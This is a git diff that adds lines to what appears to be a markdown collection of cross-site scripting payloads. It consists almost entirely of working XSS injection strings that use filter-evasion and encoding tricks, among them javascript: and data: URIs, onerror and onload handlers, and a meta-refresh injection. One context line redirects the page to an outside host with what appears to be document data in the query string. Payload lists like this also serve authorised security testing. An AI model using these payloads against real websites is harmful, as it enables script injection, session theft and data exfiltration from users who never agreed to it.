@@ -117,6 +117,22 @@ java%0dscrip%0d%1b%1bt:console.log`${location=`https://www.pudim. com?c=${docume
 \"><iframe/src=javascript:alert%26%23x000000028%3b)>
 \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/*+*/oNcliCk=alert()+)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
+<Video><source onerror = "javascript: alert (XSS)">
+<Input value = "XSS" type = text>
+<applet code="javascript:confirm(document.domain);">
+<isindex x="javascript:" onmouseover="alert(document.domain)">
+"></SCRIPT>''>'><SCRIPT>alert(String.fromCharCode(88.83.83))</SCRIPT>
+"><img src="x:x" onerror="alert(document.domain)">
+"><iframe src="javascript:alert(document.domain)">
+<object data="javascript:alert(document.domain)">
+<isindex type=image src=1 onerror=alert(document.domain)>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
+<iframe/src="data:text/html,<svg onload=alert(document.domain)>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(document.domain)" http-equiv="refresh"/>
+
 ```
 
 ## XSS + SSRF <br>
